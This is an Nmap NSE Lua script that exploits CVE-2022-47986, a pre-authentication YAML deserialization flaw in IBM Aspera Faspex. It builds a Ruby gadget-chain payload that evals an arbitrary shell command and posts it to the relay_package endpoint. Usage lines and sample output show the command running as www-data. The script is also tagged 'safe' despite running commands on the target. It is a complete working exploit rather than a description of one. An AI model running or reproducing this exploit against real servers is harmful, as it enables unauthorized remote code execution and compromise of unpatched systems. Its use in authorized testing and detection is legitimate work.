description = [[
  This script exploit IBM Aspera Faspex YAML deserialization vulnerability,
  a RCE (Remote Code Execution).
]]

author = "Maurice LAMBERT <mauricelambert434@gmail.com>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"safe", "exploit", "intrusive", "vuln"}

---
-- @name
-- Aspera Faspex RCE CVE-2022-47986 - Web Server Remote Code Execution
-- @author
-- Maurice LAMBERT <mauricelambert434@gmail.com>
-- @usage
-- nmap -p 443 --script ibm-aspera-faspex-rce [--script-args ("command=<command>")] <target>
-- @args command Command to exploit the RCE and print output
-- @output
-- ~# nmap -p 443 --script ibm-aspera-faspex-rce 172.17.0.2
-- PORT    STATE SERVICE
-- 443/tcp open  https
-- | ibm-aspera-faspex-rce: 
-- |   CVE-2022-47986: 
-- |     title: Aspera Faspex CVE-2022-47986 RCE
-- |     state: VULNERABLE (Exploitable)
-- |     ids: 
-- |       CVE:CVE-2022-47986
-- |     description: 
-- |       This script exploit IBM Aspera Faspex YAML deserialization vulnerability, a RCE (Remote Code Execution).
-- |     dates: 
-- |       disclosure: 
-- |         day: 02
-- |         year: 2022
-- |         month: 02
-- |     disclosure: 2022-02-02
-- |     refs: 
-- |       https://nvd.nist.gov/vuln/detail/CVE-2022-47986
-- |       https://blog.assetnote.io/2023/02/02/pre-auth-rce-aspera-faspex/
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-47986
-- |       https://github.com/mauricelambert/CVE-2022-47986
-- |     exploit output: 
-- |        
-- | uid=33(www-data) gid=33(www-data) groups=33(www-data)
-- |_
-- @output
-- ~# nmap -p 443 --script ibm-aspera-faspex-rce --script-args "command=id" 172.17.0.2
-- PORT    STATE SERVICE
-- 443/tcp open  https
-- | ibm-aspera-faspex-rce: 
-- |   CVE-2022-47986: 
-- |     title: Aspera Faspex CVE-2022-47986 RCE
-- |     state: VULNERABLE (Exploitable)
-- |     ids: 
-- |       CVE:CVE-2022-47986
-- |     description: 
-- |       This script exploit IBM Aspera Faspex YAML deserialization vulnerability, a RCE (Remote Code Execution).
-- |     dates: 
-- |       disclosure: 
-- |         year: 2022
-- |         month: 02
-- |         day: 02
-- |     disclosure: 2022-02-02
-- |     refs: 
-- |       https://nvd.nist.gov/vuln/detail/CVE-2022-47986
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-47986
-- |       https://blog.assetnote.io/2023/02/02/pre-auth-rce-aspera-faspex/
-- |       https://github.com/mauricelambert/CVE-2022-47986
-- |     exploit output: 
-- |        
-- | uid=33(www-data) gid=33(www-data) groups=33(www-data)
-- |_


local shortport = require "shortport"
local stdnse = require "stdnse"
local vulns = require "vulns"
local http = require "http"
local nmap = require "nmap"

local detect_only = false

portrule = shortport.http

local function get_payload()

  stdnse.debug2("Set command...")
  local command = nmap.registry.args.command or "id"

  stdnse.debug2("Building exploit...")

  local exploit = [[
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "pew"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:PrettyPrint
             output: !ruby/object:Net::WriteAdapter
                 socket: &1 !ruby/module "Kernel"
                 method_id: :eval
             newline: "throw `]] .. command .. [[`"
             buffer: {}
             group_stack:
              - !ruby/object:PrettyPrint::Group
                break: true
         method_id: :breakable
]]

  stdnse.debug2("Building payload...")

  local payload = [[{
  "package_file_list": [
    "/"
  ],
  "external_emails": "\n]] .. string.gsub(string.gsub(exploit, '"', "\\\""), '\n', '\\n') .. [[",
  "package_name": "assetnote_pack",
  "package_note": "hello from assetnote team",
  "original_sender_name": "assetnote",
  "package_uuid": "d7cb6601-6db9-43aa-8e6b-dfb4768647ec",
  "metadata_human_readable": "Yes",
  "forward": "pew",
  "metadata_json": "{}",
  "delivery_uuid": "d7cb6601-6db9-43aa-8e6b-dfb4768647ec",
  "delivery_sender_name": "assetnote",
  "delivery_title": "TEST",
  "delivery_note": "TEST",
  "delete_after_download": true,
  "delete_after_download_condition": "IDK"
}]]

  return payload
end

action = function(host, port)
  local vuln = {
    title = "Aspera Faspex CVE-2022-47986 RCE",
    state = vulns.STATE.NOT_VULN,
    IDS = { CVE = 'CVE-2022-47986' },
    description = "This script exploit IBM Aspera" ..
      " Faspex YAML deserialization vulnerability," ..
      " a RCE (Remote Code Execution).",
    references = {
       'https://nvd.nist.gov/vuln/detail/CVE-2022-47986',
       'https://blog.assetnote.io/2023/02/02/pre-auth-rce-aspera-faspex/',
       'https://github.com/mauricelambert/CVE-2022-47986',
     },
     dates = {
       disclosure = {year = '2022', month = '02', day = '02'},
     },
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)

  stdnse.print_verbose("Web service is up. Send payload...")
  stdnse.debug2("Send HTTP request.")

  local response = http.post(
    host,
    port,
    '/aspera/faspex/package_relay/relay_package',
    {},
    nil,
    get_payload()
  )

  stdnse.debug2("Get HTTP response.")
    
  vuln.state = vulns.STATE.EXPLOIT

  local output = report:make_output(vuln)

  output["CVE-2022-47986"]["exploit output"] = (
    "\n       " .. "\n" .. response.body .. "\n"
  )

  return output
end
